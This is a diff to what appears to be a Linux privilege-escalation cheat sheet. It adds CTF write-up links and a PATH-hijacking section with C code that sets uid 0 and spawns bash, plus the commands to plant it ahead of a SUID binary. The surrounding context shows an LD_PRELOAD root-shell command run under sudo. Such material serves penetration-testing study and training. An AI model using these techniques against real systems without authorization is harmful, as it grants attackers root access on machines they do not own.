@@ -182,9 +182,17 @@ void _init() {
 
 Execute any binary with the LD\_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`
 
+#### Example:
+
+{% embed url="https://lojique.gitbook.io/hack-the-box/v/photobomb/privilege-escalation" %}
+
 {% hint style="danger" %}
 A similar privesc can be abused if the attacker controls the **LD\_LIBRARY\_PATH** env variable because he controls the path where libraries are going to be searched.
 {% endhint %}
+
+#### Example
+
+{% embed url="https://lojique.gitbook.io/proving-grounds/v/sybaris/privilege-escalation" %}
 
 ```c
 #include <stdio.h>
@@ -312,13 +320,7 @@ reset; sh 1>&0 2>&0
 
 ## SUID
 
-SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distributions. If a file with this bit is run, the uid will be changed by the owner one. If the file owner is `root`, the uid will be changed to `root` even if it was executed from user `bob`. SUID bit is represented by an `s`.
-
-```bash
-╭─swissky@lab ~  
-╰─$ ls /usr/bin/sudo -alh                  
--rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
-```
+SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distribution. If a file with this bit is run, the uid will be changed by the owner one. If the file owner is `root`, the uid will be changed to `root` even if it was executed from user `bob`. SUID bit is represented by an `s`.
 
 #### Find SUID binaries
 
@@ -377,6 +379,28 @@ sudo chmod +s /tmp/suid # setuid bit
 [GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
 
 The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
+
+## Path
+
+{% embed url="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" %}
+
+{% code title="/tmp/shell" %}
+```c
+#include <unistd.h>
+void main()
+{    setuid(0);
+     setgid(0);
+     system("/bin/bash");   
+}
+```
+{% endcode %}
+
+```bash
+cd /tmp
+gcc shell.c -o shell
+export PATH=/tmp:$PATH
+./file_having_SUID_permissions
+```
 
 ## Writable files
 
